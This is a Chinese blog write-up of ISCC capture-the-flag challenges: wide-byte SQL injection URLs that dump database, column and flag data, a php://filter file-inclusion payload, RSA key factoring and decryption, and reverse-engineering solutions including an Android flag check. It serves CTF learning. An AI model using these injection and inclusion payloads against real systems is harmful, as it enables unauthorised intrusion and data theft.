+<p>payload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- 数组绕过```strcmp()```的判断，用科学技术绕过对password的判断</span><br><span class="line"></span><br><span class="line">## SQL注入的艺术</span><br><span class="line">- 宽字节注入</span><br><span class="line">```http://118.190.152.202:8015/index.php?id=1%df&apos; 1=2%23```返回错误</span><br><span class="line">- 可以手工注或者```sqlmap```跑下</span><br><span class="line">- ```order by 8```得到有8列</span><br><span class="line">- 爆数据库名：```http://118.190.152.202:8015/index.php?id=-1%df&apos; union select 1,database(),3,4,5,6,7,8 %23</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>爆表名：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 爆列名：```http://118.190.152.202:8015/index.php?id=-1%df&apos; union select 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_name=0x61646d696e73%23</span><br></pre></td></tr></table></figure></p>
+</li>
+<li><p>爆flag:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 试试看</span><br><span class="line">- 文件包含,对后缀加了判断，一定要是以jpg结尾，所以包含两个文件</span><br><span class="line">- payload:```http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php</span><br></pre></td></tr></table></figure></p>
+</li>
+<li><p>尝试一些常见目录，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Reverse</span><br><span class="line">## 0x00 rsa256</span><br><span class="line"></span><br><span class="line">- 简单的rsa题</span><br><span class="line">- 给了公钥和密文</span><br><span class="line">- 查看公钥信息```openssl rsa -pubin -text -modulus -in warmup -in public.key</span><br></pre></td></tr></table></figure></p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:d9:9e:95:22:96:a6:d9:60:df:c2:50:4a:ba:54:</span><br><span class="line">    5b:94:42:d6:0a:7b:9e:93:0a:ff:45:1c:78:ec:55:</span><br><span class="line">    d5:55:eb</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=D99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhANmelSKWptlg38JQSrpUW5RC1gp7npMK</span><br><span class="line">/0UceOxV1VXrAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>发现n是可分解的，用yafu工具进行分解，得到p、q</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P39 = 325045504186436346209877301320131277983</span><br><span class="line">P39 = 302825536744096741518546212761194311477</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用rsatools生产私钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -o private.pem -e 65537 -p 302825536744096741518546212761194311477 -q 325045504186436346209877301320131277983</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用私钥进行解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in encrypted.message1 -inkey private.pem</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="0x01-My-math-is-bad"><a href="#0x01-My-math-is-bad" class="headerlink" title="0x01 My math is bad"></a>0x01 My math is bad</h2><ul>
+<li>两次求解多元方程组<br><img src="https://i.loli.net/2018/05/08/5af0fcd99e268.png" alt></li>
+<li>找到验证函数<br><img src="https://i.loli.net/2018/05/08/5af0fdb6394fe.png" alt><br><img src="https://i.loli.net/2018/05/08/5af0fdb63ac88.png" alt></li>
+<li>解两次多元方程组，用matlab<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a, b, c, d] = solve(&apos;b * a - d * c = 2652042832920173142&apos;,&apos;3 * c + 4 * d - b - 2 * a = 397958918&apos;,&apos;3 * a * d - c * b = 3345692380376715070&apos;,&apos;27 * b + a - 11 * d - c = 40179413815&apos;)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[v3,v4,v5,v6]=solve(&apos;v6 * 39 + v3 * 22 - v4 - v5 = 61799700179&apos;,&apos;v6 + v3 + v5 * 45 - v4 * 45 = 48753725643&apos;,&apos;v3 * 35 + v4 * 41 - v5 - v6 = 59322698861&apos;,&apos;v5 * 36 + v3 - v4 - v6 * 13 = 51664230587&apos;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用gdb调出随机数,需要注意下小端序<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">a= [<span class="number">0x6F</span>,<span class="number">0x70</span>,<span class="number">0x6D</span>,<span class="number">0x61</span>]</span><br><span class="line">b= [<span class="number">0x6B</span>,<span class="number">0x5A</span>,<span class="number">0x32</span>,<span class="number">0x5A</span>]</span><br><span class="line">c= [<span class="number">0x31</span>,<span class="number">0x6B</span>,<span class="number">0x6E</span>,<span class="number">0x4E</span>]</span><br><span class="line">d= [<span class="number">0x33</span>,<span class="number">0x6C</span>,<span class="number">0x48</span>,<span class="number">0x4E</span>]</span><br><span class="line">e=[<span class="number">0x30</span>,<span class="number">0x63</span>,<span class="number">0x54</span>,<span class="number">0x4E</span>]</span><br><span class="line">f=[<span class="number">0x31</span>,<span class="number">0x63</span>,<span class="number">0x54</span>,<span class="number">0x4E</span>]</span><br><span class="line">g=[<span class="number">0x6F</span>,<span class="number">0x4E</span>,<span class="number">0x33</span>,<span class="number">0x5A</span>]</span><br><span class="line">h=[<span class="number">0x47</span>,<span class="number">0x46</span>,<span class="number">0x47</span>,<span class="number">0x61</span>]</span><br><span class="line">dd=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a[::<span class="number">-1</span>]:</span><br><span class="line">    dd+=chr(i)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b[::<span class="number">-1</span>]:</span><br><span class="line">    dd+=chr(i)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c[::<span class="number">-1</span>]:</span><br><span class="line">    dd+=chr(i)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d[::<span class="number">-1</span>]:</span><br><span class="line">    dd+=chr(i)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> e[::<span class="number">-1</span>]:</span><br><span class="line">    dd+=chr(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f[::<span class="number">-1</span>]:</span><br><span class="line">    dd+=chr(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> g[::<span class="number">-1</span>]:</span><br><span class="line">    dd+=chr(i)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> h[::<span class="number">-1</span>]:</span><br><span class="line">    dd+=chr(i)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> (dd,len(dd))</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="mobile"><a href="#mobile" class="headerlink" title="mobile"></a>mobile</h1><h2 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h2><ul>
+<li>写法奇特，不知道怎么写的，把入口点隐藏了，但是在<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">![77.PNG](https://i.loli.net/2018/05/10/5af46c1a351d0.png)</span><br><span class="line">- 修改后缀为dex,转成jar就能查看了</span><br><span class="line">- 入口点</span><br><span class="line">```java</span><br><span class="line">protected void onCreate(Bundle paramBundle)</span><br><span class="line">  &#123;</span><br><span class="line">    super.onCreate(paramBundle);</span><br><span class="line">    setContentView(2130903065);</span><br><span class="line">    this.button = ((Button)findViewById(2131296337));</span><br><span class="line">    this.editText = ((EditText)findViewById(2131296336));</span><br><span class="line">    this.runtimesText = ((EditText)findViewById(2131296338));</span><br><span class="line">    this.button.setOnClickListener(new View.OnClickListener()</span><br><span class="line">    &#123;</span><br><span class="line">      public void onClick(View paramAnonymousView)</span><br><span class="line">      &#123;</span><br><span class="line">        String str = MainActivity.this.editText.getText().toString();</span><br><span class="line">        if (!new ProtectClass().protectMethod(str))</span><br><span class="line">        &#123;</span><br><span class="line">          Toast.makeText(MainActivity.this, &quot;Wrong Flag&quot;, 0).show();</span><br><span class="line">          return;</span><br><span class="line">        &#125;</span><br><span class="line">        Toast.makeText(MainActivity.this, &quot;Correct Flag&quot;, 0).show();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    Button localButton = (Button)findViewById(2131296339);</span><br><span class="line">    this.runtime = ((TextView)findViewById(2131296340));</span><br><span class="line">    localButton.setOnClickListener(new View.OnClickListener()</span><br><span class="line">    &#123;</span><br><span class="line">      public void onClick(View paramAnonymousView)</span><br><span class="line">      &#123;</span><br><span class="line">        MainActivity.this.runtime.setText(&quot;&quot;);</span><br><span class="line">        new Thread(MainActivity.this).start();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    GetMethodInfo();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public void run()</span><br><span class="line">  &#123;</span><br><span class="line">    Bundle localBundle = new Bundle();</span><br><span class="line">    localBundle.putString(&quot;time&quot;, getRuntime());</span><br><span class="line">    Message localMessage = new Message();</span><br><span class="line">    localMessage.setData(localBundle);</span><br><span class="line">    this.handler.sendMessage(localMessage);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">```java</span><br><span class="line">public boolean protectMethod(String paramString)</span><br><span class="line">  &#123;</span><br><span class="line">    for (int i = 0;; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      if (i &gt;= MainActivity.runTimes &gt;&gt; 1) &#123;</span><br><span class="line">        return paramString.equals(&quot;BFS-ISCC&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      if (!&quot;123456&quot;.equals(&quot;123456&quot;)) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>果然是小试牛刀用的</li>
+</ul>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://yoursite.com">John Doe</a>
+            <p>原文链接：<a href="http://yoursite.com/2018/05/30/iscc-writeup/">http://yoursite.com/2018/05/30/iscc-writeup/</a>
+            <p>发表日期：<a href="http://yoursite.com/2018/05/30/iscc-writeup/">May 30th 2018, 10:41:01 am</a>
+            <p>更新日期：<a href="http://yoursite.com/2018/05/30/iscc-writeup/">May 30th 2018, 10:43:36 am</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/07/30/BugkuCTF刷题/" title= "'BugkuCTF刷题'">
+                    <div class="nextTitle">'BugkuCTF刷题'</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/05/30/ciscn-wp/" title= "ciscn_wp">
+                    <div class="prevTitle">ciscn_wp</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1223279817@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/lethalo" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-that？"><span class="toc-number">1.1.</span> <span class="toc-text">What is that？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#秘密电报"><span class="toc-number">1.2.</span> <span class="toc-text">秘密电报</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#重重谍影"><span class="toc-number">1.3.</span> <span class="toc-text">重重谍影</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有趣的ISCC"><span class="toc-number">1.4.</span> <span class="toc-text">有趣的ISCC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Where-is-the-FLAG？"><span class="toc-number">1.5.</span> <span class="toc-text">Where is the FLAG？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#凯撒十三世"><span class="toc-number">1.6.</span> <span class="toc-text">凯撒十三世</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一只猫的心思"><span class="toc-number">1.7.</span> <span class="toc-text">一只猫的心思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#暴力XX不可取"><span class="toc-number">1.8.</span> <span class="toc-text">暴力XX不可取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#比较数字大小"><span class="toc-number">2.1.</span> <span class="toc-text">比较数字大小</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web01"><span class="toc-number">2.2.</span> <span class="toc-text">web01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#你能跨过去吗？"><span class="toc-number">2.3.</span> <span class="toc-text">你能跨过去吗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一切都是套路"><span class="toc-number">2.4.</span> <span class="toc-text">一切都是套路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web02"><span class="toc-number">2.5.</span> <span class="toc-text">web02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Please-give-me-username-and-password"><span class="toc-number">2.6.</span> <span class="toc-text">Please give me username and password!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-My-math-is-bad"><span class="toc-number">2.7.</span> <span class="toc-text">0x01 My math is bad</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mobile"><span class="toc-number">3.</span> <span class="toc-text">mobile</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#小试牛刀"><span class="toc-number">3.1.</span> <span class="toc-text">小试牛刀</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 12
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/BugkuCTF刷题/" >'BugkuCTF刷题'</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/iscc-writeup/" >iscc_writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/ciscn-wp/" >ciscn_wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href= "/2018/04/06/买书/" >买书</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href= "/2018/03/11/数据结构/" >数据结构</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span><a class="archive-post-title" href= "/2018/03/08/N皇后问题/" >N皇后问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/07</span><a class="archive-post-title" href= "/2018/03/07/shiyanbar-rev/" >shiyanbar_rev</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/2018/03/06/dfs-走迷宫/" >dfs_走迷宫</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/2018/03/06/Reversing-kr-Write-UP/" >Reversing.kr_Write_UP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href= "/2018/03/05/hgame2018-re/" >hgame2018_re</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2018/02/27/Hgame-week1/" >Hgame_week1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/16</span><a class="archive-post-title" href= "/2018/02/16/MD简单语法/" >MD简单语法</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="dfs,c++"><span class="iconfont-archer">&#xe606;</span>dfs,c++</span>
+    
+        <span class="sidebar-tag-name" data-tags="dfs,c语言"><span class="iconfont-archer">&#xe606;</span>dfs,c语言</span>
+    
+        <span class="sidebar-tag-name" data-tags="reverse"><span class="iconfont-archer">&#xe606;</span>reverse</span>
+    
+        <span class="sidebar-tag-name" data-tags="dfs"><span class="iconfont-archer">&#xe606;</span>dfs</span>
+    
+        <span class="sidebar-tag-name" data-tags="shiyanbar,write_up"><span class="iconfont-archer">&#xe606;</span>shiyanbar,write_up</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
